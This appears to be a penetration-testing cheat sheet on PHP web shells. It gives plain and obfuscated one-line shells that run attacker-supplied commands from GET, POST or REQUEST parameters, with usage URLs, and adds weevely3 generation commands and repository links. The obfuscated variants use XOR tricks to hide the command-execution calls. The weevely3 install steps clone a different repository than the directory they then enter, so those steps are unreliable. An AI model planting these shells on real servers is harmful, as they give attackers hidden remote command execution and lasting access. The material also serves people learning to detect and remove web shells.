# Overview
>A webshell is a shell that you can access through the web. This is useful for when you have firewalls that filter outgoing traffic on ports other than port 80. As long as you have a webserver, and want it to function, you can't filter our traffic on port 80 (and 443). It is also a bit more stealthy than a reverse shell on other ports since the traffic is hidden in the http traffic.

# All
https://github.com/tennc/webshell

# PHP
https://github.com/bayufedra/Tiny-PHP-Webshell

## Simple
```php
<?=`$_GET[0]`?>
# Usage: http://target.com/path/to/shell.php?0=command

<?=`$_POST[0]`?>
# Usage: curl -X POST http://target.com/path/to/shell.php -d "0=command"

<?=`{$_REQUEST['_']}`?>
# Usage:
# - http://target.com/path/to/shell.php?_=command
# - curl -X POST http://target.com/path/to/shell.php -d "_=command"
```

## Obfuscated
```php
<?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>
# Usage: http://target.com/path/to/shell.php?0=command

<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?> <?=${'_'.$_}["_"](${'_'.$_}["__"]);?>

# Usage: http://target.com/path/to/shell.php?_=system&__=ls
```

## Tools
https://github.com/epinna/weevely3

```bash
# install
git clone https://github.com/tennc/webshell.git
apt-get install -y python3 python3-pip curl
cd weevely3/
pip3 install -r requirements.txt --upgrade

# usage
python3 weevely.py generate <password> <path>
python3 weevely.py <URL> <password> [cmd]
```

# Mitigations
https://github.com/nsacyber/Mitigating-Web-Shells